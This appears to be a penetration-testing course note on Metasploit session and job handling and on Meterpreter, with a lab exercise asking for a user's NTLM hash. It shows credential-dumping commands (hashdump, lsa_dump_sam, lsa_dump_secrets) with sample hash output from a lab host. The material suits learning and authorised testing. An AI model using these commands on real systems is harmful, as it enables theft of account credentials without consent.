# 🆘 MSF Sessions

## Sessions & Jobs

`Sessions` creates dedicated control interfaces for all of your deployed modules. once a session is placed in the background, it will continue to run, and our connection to the target host will persist.

we can background the session as long as they form a channel of communication with the target host with `CRTL+Z`

We can use the `sessions` command to view our currently active sessions.

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions
```

And we can interract with sessions with the `sessions -i [no.]` command

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
```

If, for example, we are running an active exploit under a specific port and need this port for a different module, we'll use `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port.

```shell-session
msf6 exploit(multi/handler) > jobs -h
```

When we run an exploit, we can run it as a job by typing `exploit -j`

**Running an Exploit as a Background Job**

```shell-session
msf6 exploit(multi/handler) > exploit -j
```

If we want to list running jobs ->

```shell-session
msf6 exploit(multi/handler) > jobs -l
```

## Meterpreter

The `Meterpreter` Payload is a specific type of multi-faceted, extensible Payload that uses `DLL injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes.

Once we got our meterpreter shell with admin rights we can dump hashes with the following command&#x20;

```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>

meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182
<SNIP>

meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
```

_**Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.**_

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
